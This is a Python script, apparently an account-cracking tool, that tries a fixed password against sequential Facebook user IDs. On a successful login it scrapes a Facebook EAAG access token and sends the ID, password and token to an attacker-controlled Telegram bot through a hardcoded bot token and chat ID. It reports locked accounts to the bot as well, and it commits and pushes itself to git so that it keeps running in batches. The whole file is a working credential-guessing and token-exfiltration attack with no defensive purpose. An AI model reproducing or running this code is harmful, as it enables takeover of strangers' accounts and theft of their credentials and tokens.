import requests
import random
import re
import os
import subprocess

TOKEN = "8295326912:AAHvVkEnCcryYxnovkD8yQawhBizJA_QE6w"
CHAT_ID = "5653032481"
PROGRESS_FILE = "progress.txt"

def send_to_tg(text):
    try: requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", json={'chat_id': CHAT_ID, 'text': text})
    except: pass

def get_eaag_token(session):
    try:
        url = "https://business.facebook.com/content_management"
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        }
        response = session.get(url, headers=headers, timeout=15)
        token_search = re.search(r'(EAAG\w+)', response.text)
        if token_search: return token_search.group(1)
        return "لم يتم العثور على التوكن"
    except: return "خطأ في السحب"

def check_fb(uid, pas):
    ua = f"Mozilla/5.0 (Linux; Android {random.randint(10,14)}; Mobile)"
    session = requests.Session()
    try:
        login_url = "https://mbasic.facebook.com/login/device-based/regular/login/"
        data = {"email": uid, "pass": pas, "login": "Log In"}
        session.post(login_url, data=data, headers={'User-Agent': ua})
        if "c_user" in session.cookies:
            token = get_eaag_token(session)
            send_to_tg(f"✅ تم الصيد!\n🆔: {uid}\n🔑: {pas}\n🎫 Token: {token}")
            return True
        elif "checkpoint" in session.cookies:
            send_to_tg(f"⚠️ مقفل (CP)\n🆔: {uid}\n🔑: {pas}")
    except: pass
    return False

def restart_session():
    subprocess.run("git add .", shell=True)
    subprocess.run("git commit -m 'V74: Enhanced Extraction'", shell=True)
    subprocess.run("git push origin main", shell=True)
    exit()

if __name__ == "__main__":
    if not os.path.exists(PROGRESS_FILE):
        with open(PROGRESS_FILE, "w") as f: f.write("26701173")
    with open(PROGRESS_FILE, "r") as f: last_id = int(f.read().strip())
    send_to_tg(f"🚀 انطلاق النسخة (V74)\n📍 البداية: {last_id}")
    for i in range(10):
        check_fb(str(last_id + i), "12345678")
    with open(PROGRESS_FILE, "w") as f: f.write(str(last_id + 10))
    restart_session()
